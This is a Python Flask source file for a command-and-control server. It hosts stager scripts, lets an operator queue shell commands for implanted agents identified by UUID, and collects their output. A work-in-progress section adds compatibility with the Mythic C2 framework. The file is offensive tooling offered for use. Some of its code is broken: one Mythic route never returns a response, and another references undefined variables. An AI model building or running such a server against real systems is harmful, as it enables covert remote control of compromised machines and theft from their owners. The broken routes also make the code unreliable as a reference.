from flask import Flask, request, Response, jsonify, send_from_directory
import redis
from functions import *
import os
import base64

# script_dir = os.path.dirname(os.path.abspath(__file__))
# db_path = os.path.join(script_dir, '..', 'data', 'agents.db') # Local DB path
db_path = "/app/data/agents.db" # Docker volume DB path
if not os.path.exists(db_path):
    create_db(db_path)

# r = redis.Redis(host='127.0.0.1', port=6379, db=0, decode_responses=True)
r = redis.Redis(host=os.getenv('REDIS_HOST'), port=6379, db=0, decode_responses=True)

app = Flask(__name__)

@app.route('/<string:script>', methods=['GET'])
def stager(script):
    return send_from_directory('scripts', script, as_attachment=False)

@app.route('/admin', methods=['POST'])
def send_command():
    data = request.json
    if request.method == 'POST':
        uuid = data.get('uuid')
        cmd = data.get('command')
        r.rpush(uuid, cmd)
        if r.llen(uuid) > 100:
            r.lpop(uuid)
    return "Command Sent!"

@app.route('/login', methods=['GET', 'POST'])
def commander():
    if request.method == 'GET':
        uuid = request.args.get('uuid')
        raw_profile = request.headers.get("User-Agent").split("/", 1)
        profile = raw_profile[0]
        ip = request.remote_addr
        cache = r.lindex(uuid, -1)
        if r.exists(uuid) == 0:
            command = register_agent(uuid, profile, ip, db_path)

        elif "SEEN" in cache or "AGENT REGISTERED" in cache:
            update_seen(uuid, db_path)
            command = ""
        else:
            update_seen(uuid, db_path)
            command = cache
            r.rpush(uuid, "SEEN")
            small_check(uuid, db_path)
        return command

    elif request.method == 'POST':
        uuid = request.args.get('uuid')
        data = request.data
        if uuid and data:
            key = f"{uuid}-output"
            r.rpush(key, data)
        return "Success"
    else:
        return "Invalid Method"


# Mythic Compatability (WIP)
@app.route('/api/v3/agent_message', methods=['POST'])
def mythic_output():
    if request.method == 'GET':
        message = request.args.get('message')
        ip = request.args.get('remote_ip')
        uuid = request.args.get('mythic_uuid')

        print(f"message: {message}, IP: {ip}, uuid: {uuid}")

@app.route('/api/v3/c2_get_tasking/<string:callback_uuid>', methods=['GET'])
def get_task_for_mythic_agent(callback_uuid):
    if request.method == 'GET':
        try: 
            cache = r.lindex(callback_uuid, -1)
            if r.exists(callback_uuid) == 0:
                command = register_agent(callback_uuid, profile, ip, db_path)

            elif "SEEN" in cache or "AGENT REGISTERED" in cache:
                update_seen(callback_uuid, db_path)
                command = ""
            else:
                update_seen(callback_uuid, db_path)
                command = cache
                r.rpush(callback_uuid, "SEEN")
                small_check(callback_uuid, db_path)

            cmd_bytes = command.encode('utf-8')
            encoded_command = base64.b64encode(cmd_bytes)
            
            response = {
                "status": "success",
                "message": encoded_command,
            }
        except: 
            response = {
                "status": "error",
                "error": "An internal server error occurred",
            }
        return jsonify(response)


# This allows you to run the app directly with `python app.py`
if __name__ == '__main__':
    app.run(debug=True)